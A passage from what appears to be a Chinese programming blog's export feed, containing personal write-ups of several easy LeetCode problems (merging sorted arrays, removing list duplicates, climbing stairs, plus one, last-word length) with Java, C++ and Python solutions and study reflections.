<p><strong>但是换一个思路，如果用倒序的顺序排序呢？</strong></p>
<p>那就可以省去这个临时数组了，不需要考虑覆盖的问题了。</p>
<p>[1,2]和[5,6]可以排下，并且由于题设nums1的大小是一定大于m+n的。所以倒序是可行的，并且节省了<strong>空间复杂度</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/merge-sorted-array</span></span><br><span class="line"><span class="comment"> * Beats : 100 %;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums1, <span class="keyword">int</span> m, <span class="keyword">int</span>[] nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        m--;</span><br><span class="line">        n--;</span><br><span class="line">        <span class="keyword">int</span> i = nums1.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(m&gt;=<span class="number">0</span> || n&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(m&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                nums1[i--] = nums2[n--];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(n&lt;<span class="number">0</span>)&#123;</span><br><span class="line">                nums1[i--] = nums1[m--];</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(nums1[m]&gt;nums2[n])&#123;</span><br><span class="line">                nums1[i--] = nums1[m--];</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                nums1[i--] = nums2[n--];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/merge-sorted-array</span></span><br><span class="line"><span class="comment"> * Beats : 11.97%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums1, <span class="keyword">int</span> m, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums2, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> i = nums1.size() - <span class="number">1</span>;</span><br><span class="line">		m--, n--;</span><br><span class="line">		<span class="keyword">while</span> (i &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">while</span> (m &gt;= <span class="number">0</span> || n &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">				<span class="keyword">if</span> (m &lt; <span class="number">0</span>)&#123;</span><br><span class="line">					nums1[i--] = nums2[n--];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (n &lt; <span class="number">0</span>)&#123;</span><br><span class="line">					nums1[i--] = nums1[m--];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (nums1[m] &gt; nums2[n])&#123;</span><br><span class="line">					nums1[i--] = nums1[m--];</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span>&#123;</span><br><span class="line">					nums1[i--] = nums2[n--];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span><span class="params">(self, nums1, m, nums2, n)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify nums1 in-place instead.</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        m -= <span class="number">1</span></span><br><span class="line">        n -= <span class="number">1</span></span><br><span class="line">        i = len(nums1) - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> m&gt;=<span class="number">0</span> <span class="keyword">or</span> n &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> m &lt; <span class="number">0</span>:</span><br><span class="line">                nums1[i] = nums2[n]</span><br><span class="line">                n -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> n &lt; <span class="number">0</span>:</span><br><span class="line">                nums1[i] = nums1[m]</span><br><span class="line">                m -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">elif</span> nums1[m] &gt; nums2[n]:</span><br><span class="line">                nums1[i] = nums1[m]</span><br><span class="line">                m -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nums1[i] = nums2[n]</span><br><span class="line">                n -= <span class="number">1</span></span><br><span class="line">            i -= <span class="number">1</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这题其实考察了归并排序中的一个知识点：合并两个数组，在这个基础上对其进行了一个小优化，由于之前学过归并排序，思路是有的，但是这个问题其实是可以不借助临时数组的。由于他的特殊性，倒序排序不会导致它的所需排序的元素被覆盖，这是应该注意的。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
        <tag>Optimize(优化)</tag>
      </tags>
  </entry>
  <entry>
    <title>83. Remove Duplicates from Sorted List</title>
    <url>/2017/04/27/83-Remove-Duplicates-from-Sorted-List/</url>
    <content><![CDATA[<p>Given a sorted linked list, delete all duplicates such that each element appear only once.</p>
<p>For example,<br><br>Given <code>1-&gt;1-&gt;2</code>, return <code>1-&gt;2</code>.<br><br>Given <code>1-&gt;1-&gt;2-&gt;3-&gt;3</code>, return <code>1-&gt;2-&gt;3</code>.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>伪码</strong></p>
<pre><code>while(head的下一个节点 != null){
    second &lt;-- head的下一个节点
    if(second的值 == head的值){
        third &lt;-- second的下一个节点
        if(third != null){
            second的值 &lt;-- third的值
            second的下一个节点 &lt;-- third的下一个节点
        }else{
            head的下一个节点 &lt;-- null
        }
    }else{
        head &lt;-- head的下一个节点
    }
}
</code></pre><p>这里用了最简单的思路：</p>
<blockquote>
<p>当前节点如果和下一个节点的值相等，则删除下一个节点（如何删除下一个节点，则应该判断下下一个节点的下一个节点是否为null），同时指针不向后遍历。<br>如果不等，则遍历下一个节点。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates1</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode first = head;</span><br><span class="line">        <span class="keyword">while</span>(first.next!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            ListNode second = first.next;</span><br><span class="line">            <span class="keyword">if</span>(second.val == first.val)&#123;</span><br><span class="line">                ListNode third = second.next;</span><br><span class="line">                <span class="keyword">if</span>(third!=<span class="keyword">null</span>)&#123;</span><br><span class="line">                    second.val = third.val;</span><br><span class="line">                    second.next = third.next;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    Err : second = null;//Only pont second is null;</span></span><br><span class="line"><span class="comment">                    We need first.next = null;</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    first.next = <span class="keyword">null</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                first = first.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>优化</strong><br>上述的方法其实太过复杂了，应该是可以优化的。我从<code>first.next!=null</code>作为的循环判断条件。最好的话，其实使用head != null是最快捷的。</p>
<h2 id="Solution3"><a href="#Solution3" class="headerlink" title="Solution3"></a>Solution3</h2><p><strong>源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates2</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode preNode = <span class="keyword">new</span> ListNode(<span class="number">9527</span>);</span><br><span class="line">        preNode.next = head;</span><br><span class="line">        <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(head.next!=<span class="keyword">null</span> &amp;&amp; head.val == head.next.val)&#123;</span><br><span class="line">                head.next = head.next.next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                head = head.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> preNode.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="更好的方法"><a href="#更好的方法" class="headerlink" title="更好的方法"></a>更好的方法</h2><p>采用递归，便于阅读以及理解。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RemoveDuplicatesfromSortedList</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="keyword">null</span> || head.next==<span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        head.next = deleteDuplicates(head.next);</span><br><span class="line">        <span class="keyword">return</span> head.val == head.next.val?head.next:head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>代码感悟</strong></p>
<blockquote>
<p>其实挺想写一下这个递归思路的，看了这个递归，其实是尾递归的一种，一开始上去确实还不太会写。主要分为3步：</p>
<ol>
<li>边界判断，如果head为null或者head没有后面的节点，则直接返回head;<br></li>
<li>head的下一个节点是递归调用这个函数的返回值。这里有说法，如果函数走到这里，倒数3个三个节点已经确定了！因为最后一个节点为null，倒数第一个节点只有一个，倒数第二个节点现在的下一个节点指向了倒数第一个节点;<br></li>
<li>递归的核心，函数返回值，判断当前节点和下一个节点的值是否相等，以此来决定返回值。<br><br>这种尾递归的操作，感觉还是挺值得思考的！</li>
</ol>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>这道题使用各种方法都可以解决，关键是解决的思路有所不同。第一种是我最先想到的，虽然逻辑上没有问题，但其实，如果采用第二种逻辑上的判断，则代码上会更少，可读性更好。<br><br>至于最后一种递归方案，我觉得是我最值得去学习的，很好的思路和方法！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Optimize(优化)</tag>
        <tag>LinkedList(链表)</tag>
      </tags>
  </entry>
  <entry>
    <title>70. Climbing Stairs</title>
    <url>/2017/04/25/70-Climbing-Stairs/</url>
    <content><![CDATA[<p>You are climbing a stair case. It takes n steps to reach to the top.</p>
<p>Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?<br><a id="more"></a></p>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><blockquote>
<p>这道题目，第一眼看过去，就是想到了递归解决。</p>
</blockquote>
<p><strong>源码</strong><br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClimbingStairs</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">return</span> climbStairs(n-<span class="number">1</span>)+climbStairs(n-<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>OK，AC不过。</p>
<pre><code>Time Limit Exceeded
Last Input: 44
</code></pre><p>由于递归的占用内存很大，所以这里当输入44时，出现了超时。</p>
<p><strong>如何解决？</strong></p>
<blockquote>
<p>我记得，能用递归解决的问题，一定能用循环解决。那这道题换个思路，用循环。可以借用一下动态规划的方法。</p>
</blockquote>
<p><strong>源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ClimbingStairs</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> arr[] = <span class="keyword">new</span> <span class="keyword">int</span>[n+<span class="number">1</span>];</span><br><span class="line">		arr[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">		arr[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;arr.length;i++)&#123;</span><br><span class="line">			arr[i] = arr[i-<span class="number">1</span>] + arr[i-<span class="number">2</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> arr[n];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h2><p>至此，已经可以AC过了，但是。还是不够，因为它的空间复杂度是O(n)。仔细思考一下，其实它所需要的变量只要3个就够了，而不需要数组。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">climbStairs</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(n&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(n == <span class="number">2</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> oneStepBefore = <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> twoStepBefore = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">int</span> allWays = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">			1 2 3 5 8</span></span><br><span class="line"><span class="comment">			t o a</span></span><br><span class="line"><span class="comment">			  t o a</span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;n;i++)&#123;</span><br><span class="line">			allWays = oneStepBefore + twoStepBefore;</span><br><span class="line">			twoStepBefore = oneStepBefore;</span><br><span class="line">			oneStepBefore = allWays;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> allWays;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>能用递归解决的问题，一定要考虑他的开销，递归虽然很快捷，但是他的开销也很大，如果需要很深的递归，那么不妨考虑下使用动态规划。或者如果可能的情况下，一定要考虑下使用循环。以减少递归带来的问题。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>recursion(递归)</tag>
        <tag>Optimize(优化)</tag>
        <tag>DP(动态规划)</tag>
      </tags>
  </entry>
  <entry>
    <title>66. Plus One</title>
    <url>/2017/04/24/66-Plus-One/</url>
    <content><![CDATA[<p>Given a non-negative number represented as an array of digits, plus one to the number.</p>
<p>The digits are stored such that the most significant digit is at the head of the list.</p>
<a id="more"></a>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>其实，仔细看这道题，进位运算是这道题的考点。何时进位，如何进位，以及连续的进位应该怎么做？</p>
<p><strong>伪码</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i&lt;--digits[digits的长度<span class="number">-1</span>];i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">    <span class="keyword">if</span>(digits[i]&lt;<span class="number">9</span>)&#123;<span class="comment">//这里很巧妙，小于9，则直接+1后return，如果能想到这里的话，基本上就很简单了</span></span><br><span class="line">        digits[i]++;</span><br><span class="line">        <span class="keyword">return</span> digits;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        digits[i] = <span class="number">0</span>;<span class="comment">//这里其实只需要置0即可，因为这里最大的进位仅为1，所以不需要考虑大于1的进位</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">newDigits数组 &lt;-- 新数组[digits的长度+<span class="number">1</span>]<span class="comment">//到达了这一步仍没有返回，说明，每一位都是9，所以，出现了比原数组多了一位。</span></span><br><span class="line">newDigits[<span class="number">0</span>] &lt;-- <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> newDigits;</span><br></pre></td></tr></table></figure>
<p><strong>源码</strong></p>
<p><strong>Java实现</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:Java</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/plus-one/</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PlusOne</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] plusOne(<span class="keyword">int</span>[] digits) &#123;</span><br><span class="line">        <span class="keyword">if</span>(digits.length == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> digits;</span><br><span class="line">        <span class="keyword">int</span> i = digits.length-<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>(i&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(digits[i]&lt;<span class="number">9</span>)&#123;</span><br><span class="line">                digits[i]++;</span><br><span class="line">                <span class="keyword">return</span> digits;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                digits[i] = <span class="number">0</span>;</span><br><span class="line">                i--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> []newDigits = <span class="keyword">new</span> <span class="keyword">int</span>[digits.length+<span class="number">1</span>];</span><br><span class="line">        newDigits[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span> newDigits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>c++实现</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * app:leetcode lang:c++</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/plus-one/</span></span><br><span class="line"><span class="comment"> * Beats : 100%;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> Solution &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; plusOne(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; digits) &#123;</span><br><span class="line">		<span class="keyword">int</span> n = digits.size() - <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span> (n &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span> (digits[n] &lt; <span class="number">9</span>)&#123;</span><br><span class="line">				digits[n] += <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">return</span> digits;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				digits[n] = <span class="number">0</span>;</span><br><span class="line">				n--;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		digits.insert(digits.begin(), <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> digits;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>python实现</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">plusOne</span><span class="params">(self, digits)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type digits: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        i = len(digits) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> digits[i] &lt; <span class="number">9</span>:</span><br><span class="line">                digits[i] += <span class="number">1</span></span><br><span class="line">                <span class="keyword">return</span> digits</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                digits[i] = <span class="number">0</span></span><br><span class="line">                i -= <span class="number">1</span></span><br><span class="line">        digits.insert(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> digits</span><br></pre></td></tr></table></figure>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><blockquote>
<p>2017年时，这道题其实对我来说很难。对于进位运算的操作和实践太少，思路也不够清晰。<br></p>
<p>2020年时，这道题对于我来说很简单了，没有难点，由于它的局限性，只是加1操作，对于加n操作的位运算，遇到了在进行分析。</p>
<p>主要思路在于，对于位上是9的操作，只需要将该位置0，而对于位上小于9的操作，只需要该位加1，返回即可。这是加1运算的局限，不需要单独的进位变量，因为进位最大不会超过1。</p>
</blockquote>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>进位运算其实很考察逻辑，需要注意的是进位。</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
        <tag>Array</tag>
      </tags>
  </entry>
  <entry>
    <title>58. Length of Last Word</title>
    <url>/2017/04/21/58-Length-of-Last-Word/</url>
    <content><![CDATA[<p>Given a string s consists of upper/lower-case alphabets and empty space characters <code>&#39; &#39;</code>, return the length of last word in the string.</p>
<p>If the last word does not exist, return 0.</p>
<p>Note: A word is defined as a character sequence consists of non-space characters only.</p>
<p>For example,<br>Given s = <code>&quot;Hello World&quot;</code>,<br>return <code>5</code>.</p>
<a id="more"></a>
<h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><h2 id="Solution1"><a href="#Solution1" class="headerlink" title="Solution1"></a>Solution1</h2><p><strong>伪码</strong></p>
<pre><code>inputString &lt;-- 输入字符串消去前后多余的空白字符
wordsArray[] &lt;-- inputString按照空格&quot; &quot;分割成字符串数组
if wordsArray的长度 == 0
return 0
else
return 数组最后元素的长度
</code></pre><p><strong>Java源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LengthofLastWord</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">		String inString = s.trim();</span><br><span class="line">		String wordsArray[] = inString.split(<span class="string">" "</span>);</span><br><span class="line">		<span class="keyword">return</span> wordsArray.length==<span class="number">0</span>?<span class="number">0</span>:wordsArray[wordsArray.length-<span class="number">1</span>].length();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h2><p>方法一操作过于复杂，不如直接操作字符效率高。</p>
<p><strong>伪码</strong></p>
<pre><code>inputString &lt;-- 输入字符串消去前后多余的空白字符
设置计数length &lt;-- 0
for(i&lt;--inputString的长度;i&gt;=0;i--){
    if(inputString在i处索引的字符不是空字符&apos; &apos;){
        length++;
    }else{
        跳出循环
    }
}
return length
</code></pre><p><strong>Java源码</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LengthofLastWord</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	String inString = s.trim();</span><br><span class="line">	<span class="keyword">int</span> length = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=inString.length()-<span class="number">1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">		<span class="keyword">if</span>(inString.charAt(i)!=<span class="string">' '</span>)&#123;</span><br><span class="line">			length++;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> length;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><blockquote>
<p>easy题，过！先看下有没有叼一点其他解法。OK~~有个写法比我吊的。</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> s.trim().length()-s.trim().lastIndexOf(<span class="string">" "</span>)-<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>其他思路：</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLastWord</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">	s = s.trim();</span><br><span class="line">	<span class="keyword">int</span> lastIndex = s.lastIndexOf(<span class="string">' '</span>) + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">return</span> s.length() - lastIndex;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>好了，不要讨论难易了，简单题更应该多看看多解性！</p>
</blockquote>
]]></content>
      <tags>
        <tag>LeetCode-easy</tag>
      </tags>
  </entry>
  <entry>
    <title>38. Count and Say</title>
    <url>/2017/04/20/38-Count-and-Say/</url>
    <content><![CDATA[<p>The count-and-say sequence is the sequence of integers beginning as follows:</p>
<font><code>1, 11, 21, 1211, 111221, ...</code></font>

<p><font><code>1</code></font> is read off as <font><code>&quot;one 1&quot;</code></font> or <font><code>11</code></font>.<br></p>
<p><font><code>11</code></font> is read off as <font><code>&quot;two 1s&quot;</code></font> or <font><code>21</code></font>.<br></p>
<p><font><code>21</code></font> is read off as <font><code>&quot;one 2</code></font>, then <font><code>one 1&quot;</code></font> or <font><code>1211</code></font>.<br><br>Given an integer n, generate the nth sequence.<br></p>
<p>Note: The sequence of integers will be represented as a string.</p>
<style type="text/css">
font{
color:rgb(199,37,78)
}
</style>

<a id="more"></a>
